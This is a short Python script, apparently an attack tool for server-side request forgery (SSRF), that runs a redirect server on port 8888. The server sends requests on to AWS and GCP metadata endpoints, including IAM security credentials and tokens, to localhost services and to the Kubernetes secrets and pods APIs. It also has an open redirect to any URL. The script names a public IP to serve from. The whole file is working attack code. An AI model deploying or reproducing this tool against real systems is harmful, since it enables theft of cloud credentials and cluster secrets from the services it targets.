#!/usr/bin/env python3
"""
HTTP redirect server for SSRF bypass testing.
Listens on port 8888 and redirects to internal targets.
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path

        # /meta -> AWS metadata
        if path == "/meta" or path == "/meta/":
            self.redirect("http://169.254.169.254/latest/meta-data/")
        elif path == "/meta-iam":
            self.redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        elif path == "/meta-token":
            self.redirect("http://169.254.169.254/latest/api/token")
        elif path == "/meta-identity":
            self.redirect("http://169.254.169.254/latest/dynamic/instance-identity/document")
        elif path == "/meta-userdata":
            self.redirect("http://169.254.169.254/latest/user-data/")
        # Localhost
        elif path == "/localhost":
            self.redirect("http://127.0.0.1/")
        elif path == "/localhost-8080":
            self.redirect("http://127.0.0.1:8080/")
        elif path == "/localhost-3000":
            self.redirect("http://127.0.0.1:3000/")
        # K8s
        elif path == "/k8s":
            self.redirect("https://kubernetes.default.svc/api/v1/namespaces")
        elif path == "/k8s-secrets":
            self.redirect("https://kubernetes.default.svc/api/v1/secrets")
        elif path == "/k8s-pods":
            self.redirect("https://kubernetes.default.svc/api/v1/pods")
        elif path == "/k8s-token":
            self.redirect("http://127.0.0.1:10255/pods")
        # GCP
        elif path == "/gcp":
            self.redirect("http://metadata.google.internal/computeMetadata/v1/")
        # Custom target from query string
        elif path.startswith("/go?"):
            params = urllib.parse.parse_qs(urllib.parse.urlparse(path).query)
            target = params.get("url", [""])[0]
            if target:
                self.redirect(target)
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Missing url param")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"SSRF redirect server. Paths: /meta /meta-iam /meta-token /localhost /k8s /k8s-secrets /gcp /go?url=TARGET")

    def do_PUT(self):
        self.do_GET()

    def do_POST(self):
        self.do_GET()

    def redirect(self, target):
        self.send_response(302)
        self.send_header("Location", target)
        self.end_headers()
        print(f"  -> Redirected to: {target}", flush=True)

    def log_message(self, format, *args):
        print(f"[REDIRECT] {self.client_address[0]} - {format % args}", flush=True)

print("Starting redirect server on 0.0.0.0:8888", flush=True)
print("Public IP: 3.151.173.70", flush=True)
print("Test: http://3.151.173.70:8888/meta", flush=True)
HTTPServer(("0.0.0.0", 8888), RedirectHandler).serve_forever()
